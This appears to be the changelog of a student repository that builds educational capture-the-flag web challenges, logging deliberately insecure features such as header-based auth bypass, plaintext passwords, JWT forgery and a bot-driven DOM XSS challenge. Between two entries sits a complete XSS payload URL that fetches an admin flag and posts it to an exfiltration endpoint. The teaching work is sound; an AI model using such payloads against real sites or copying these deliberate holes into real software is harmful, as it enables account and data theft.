# CHANGELOG.md
The logs will have newer updates at the top. Each entry is of the following format:

### Title - Date - CTF Number
- description

files changed (optional)

# Logs:





### Pt2 Docker setup - 29/03/26 - Repo
- Carrying on from the previous git commit.
- CTF2 is now done, however the actual exploit needs some work.
- CTF3 is now working too but only on chrome. Some work needs to be done for it to work properly on safari.

### Finished Docker - 28/03/26 - Repo
- Made each of the CTFs work using docker rather than worrying about dependencies
- CTF1 works but the others have some work to do.

### CTF analysis - 28/03/26 - Repo
- Created CTF_REPO_ANALYSIS.md to doccument progress and what i have done so far.

### Fixed XSS exploit path - 10/03/26 - CTF 4
- Before, the XSS worked, but the exploit path was too difficult for the target players (Y2 CS students) to workout withgout prior knowledge.
Backend:
  - Added /api/routes endpoint for API discovery.
  - Improved /api/admin/flag 403 responses with usage and hints.
  - Fixed reportId handling and capture filtering in /api/exfil.
  - Added DB migrations for visited_url and bot_console_logs.
  - Seeded scaffolding KB articles and ensured player users are upserted with bcrypt passwords.
Infrastructure:
  - Updated DB schema to include visited_url and bot_console_logs.
  - Added unique index on kb_articles.title.
  - Included scaffolding KB article seeds.
Frontend
  - Improved /captures hints (now always visible).
  - Enhanced /report UI with report ID confirmation, visited URL display, and bot console logs.
Docs
  - Simplified exploit instructions in SOLUTION.md.
  - Removed outdated payload examples and raw backend port references.
  - Updated workflow.md to reflect current UX and documentation fixes.

### Quick changes - 10/03/26 - CTF 4
- A few save.
- Minor changes. The current exploit path is difficult to figure out, so attempting to make it easier and more intuitive.

### CTF 4 Complete - 04/03/26 - CTF 4
- The main exploit is now working, but we have a lot more work to do.
- Fully functional DOM XSS challenge with bot-based exploitation
- Per-user flag derivation using HMAC-SHA256
- Exfiltration system with player-accessible capture view
- Management scripts (reset, health-check, log collection)
- Bot logging and deterministic behavior
- Working report system with BullMQ queue processing


### Bot Updated - 03/02/26 - CTF 4
- We have updated the bot logic so that it works as intended.
- When the user submits an issue in the 'Report Issue' (/report), the bot will visit the link.
- We can use this to implement the XSS, where the bot will visit the link and activate the payload unwittingly.
- The bot is deterministic.

### Report System Implemented - 03/02/26 - CTF 4
- Working report system: when a user inputs a valid URL, it cues for the bot to look at.
- Next is to get the bot working to process the requests.

### Fixed login logic - 02/02/26 - CTF 4
- Logging in now needs a username/password (no email).
- We have scripts to automate flag gen and login gen. We just need the usernames of the players to do so.
- Deleted old scripts and old json data files.


### Initial commit - 02/02/26 - CTF 4
- We have made the skeleton and UI of CTF 4.
- We have some front and backend and it is visually ready.
- This is just an initial commit, we have no implemented exploit just yet.
- Documentation needs some work while we are at it.
- We also have a new PORT_ALLOCATION.md for future use, so that I can keep track of what CTF uses what port.

### Saved checkpoint - 02/02/26 - CTF 3
- Saved everything. I will come back to complete this CTF at a future date. OI wnat to get started on CTF4 now in preperation for the project demo.

### Added references - 30/01/26 - CTF 3
- Added references to the end of the readme.md.

### Updated readme to include tech stack - 30/01/26 - CTF 3
- Updated readme to include tech stack

### Mostly complete CTF - 30/01/26 - CTF 3
- The CTF now has (completed) 4 parts. This includes path traversal, encryption key discovery, finding hidden employee (and finding their details) and decrypting the hidden info.
- Next stages will include how to incorpeate challenge-generation into the CTF.

### Partial completion (flags 1 and 2) - 30/01/26 - CTF 3
- We now have the base for a fun multistage CTF. If you go to source, you can find /flag, which can be accessed via XSS (flag 1), it also has instructions. Furthermore, legacyAuth.ts contains the key (flag 2) to decrypt flag 3. Flag 3 is stored in a hidden user, but that isn't currently working.
- We are aiming to have advanced SQL injection used for flag 3.
- Flag 4 will be the decoded flag 3, which is the actual answer and flag players must find.

### Added Pay Page - 29/01/26 - CTF 3
- I added a pay page, including the front-end of it to display monthly and yearly pay of employees. The pay is worked out randomly according to a function in generate_credentials.js

### Updated Credentials Database - 28/01/26 - CTF 3
- Previously, data was stored only in flags.json, including just username and flag. We now generated passwords, as well as other information.
- Schema:
  - `username` (primary key)
  - `password` (plaintext - INSECURE BY DESIGN)
  - `password_hint` 
  - `last_login`
  - `created_at`, `updated_at`
- We also updated the documentation including the README.md and the SETUP_CREDENTIALS.md.
- We also changed the port numbers used, there was a clash with CTF2.
- Fixed CORS bug following the changes too.

### Fixed Login - 28/01/26 - CTF 3
- We previously was not able to login. Issues with the backend. We now have that working. The website is still bare and has limited useful functionality so we need to take a look at that.

### Initial Commit - 26/01/26 - CTF 3
- Initial commit. There is a lot wrong with the current code, so we may have to fall back later, but its okay for now.
- We are currently working on getting docker working, and having the site up and running still.

### Login Limiter - 19/01/26 - CTF 2
- Added a login limiter.

### Fixed vault bug - 19/01/26 - CTF 2
- The vault had a bug where it had the flag on abcd12's account. The server didn't let me delete it.
I fixed this.

### Full CTF completion - 17/01/26 - CTF 2
- I added the complete implementation of the CTF. It is two stages, once the user solves the /app/challenge,
they will be able to use the secret JWT signature to forge the cookie. There still remains minor fixes to the CTF though.

### Modified Vault (/app/vault) - 17/01/26 - CTF 2
- Added a few users for realism, including the flag.

### Added Vault Feature (/app/vault) - 15/01/26 - CTF 2
- Built a /app/vault. It has a with a table interface displaying storing credentials. Implemented server-side storage in vaults.json with JWT-based authentication where vault entries are keyed by username extracted from the session token. Added complete CRUD API endpoints (GET, POST, DELETE) for vault management with intentional vulnerabilities including plaintext password storage and predictable entry IDs for CTF exploitation scenarios.

### Flag Generation - 10/12/25 - CTF 2
- I made a generator, similar to CTF1, where with usernames, we can generate individualised flags.

### Fixed refresh issue - 10/12/25 - CTF 2
- When logged in, if you refreshed it sent you straight back to the login page. I fixed this. I also added bootstrap/csv to make it look better.

### Initial Commit CTF2 - 10/12/25 - CTF 2
- Added general structure and got the basics of CTF working.

### Modified redme - 10/12/25 - CTF 1
- Changed readme. We now include instructions on how to add more players username/password and to generate the flags automatically.

### Added CHANGELOG.md - 05/12/25 - Repo
- Added this CHANGELOG.md file to log all changes.

### Updated flag generation. It now works properly. - 04/12/25 - CTF 1
- We modified basic1_generator.js to essentially use each username to act as a seed to generate a flag for each stuedent. It is deterministic.
- For each CTF, we will have a salt. So that for each CTF, username+salt generates a token for each student.
- It is automated too. If you add a new user, you can easily run the script to automatically get their flag, and so the CTF is now scalable.

### clear previous cookie session - 04/12/25 - CTF 1
- When switching accounts I found that it can someties remember the cookie. So I simply modified the JS to refresh it every time.

### flag_individualisation - 04/12/25 - CTF 1
- worked on the flag individualisation. Not fully complete yet though.

### Modified the hint - 03/12/25 - CTF 1
- The hint was out in the open. I removed it and made sure it only pops up after 4 reloads of the page /flag.

### removed challenge gen files - 27/11/25 - CTF 1
- I couldn't get Charles's Challenge generation to work. So I temporarily scrapped it.

### updated readme - 27/11/25 - CTF 1
- updated readme.
http://localhost:5174/kb?search=<img src=x onerror="(async()=>{const u=new URLSearchParams(location.search);const r=u.get('_reportId');const res=await fetch('/api/admin/flag?reportId='+r);const d=await res.json();fetch('/api/exfil/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:d,reportId:r})})})()">
### fixed front-end CSV issues. Also fixed minor bug. - 27/11/25 - CTF 1
- The rate limiter had some issues, so we fixed that.
- Modified the CSV.

### added CSV and bootstrap - 27/11/25 - CTF 1
- Simply modified front end to include CSVs. Using bootstrap, it now isn't plain. This was a concern of David's and was a trivial fix.

### Introduced login rate limiter - 27/11/25 - CTF 1
- The CTF could be password brute forced, which allows admin access. This was unintended so I added a login rate limiter that makes brute force infeasible. Even if students refreshed their page, since we remember cookies, we can stop them logging in temporarily.

### updated solutions.md file - 24/11/25 - CTF 1
- Updated the solutions.md file.

### Removed uneeded vulnerability - 24/11/25 - CTF 1
- There was an issue, where if the player got the b64 cookie for an admin, they could paste it as the password and then log in as an admin. This was unintended so we fixed the faulty JS file.

### Added testing and a readme - 20/11/25 - CTF 1
- Added a readme file. There still needs to be work done on that as we go. We have also added testing.

### Fixed unintended path traversal vulnerability - 20/11/25 - CTF 1
- The CTF had an issue with path traversal which was unintended. So, I fixed that.

### Added SOLUTIONS.md file - 20/11/25 - CTF 1
- Added solutions file.

### Add full browser-based CTF (login bypass + insecure cookie) and remove old header auth challenge - 20/11/25 - CTF 1
- got it working (kind of). 

### feat: initial complete Node.js CTF implementation - 20/11/25 - CTF 1
- A barebones version of the site is up and running. We got the layout all set.
- Implemented Express server, routing modules, controllers, and services
- Added intentionally insecure auth middleware (X-Admin header bypass)
- Implemented protected /debug and /flag endpoints
- Added environment variable handling (.env, .env.example)
- Added static public page and basic config metadata (ctf-config.json)
- Verified working exploit and flag retrieval

### Added node modules - 20/11/25 - CTF 1
- Added Node modules and set up the directory /Advanced-Project/CTFs/Basic_1_Nodejs.
- 

### Initial Commit - 20/10/25 - Repo
- created the repo and added a description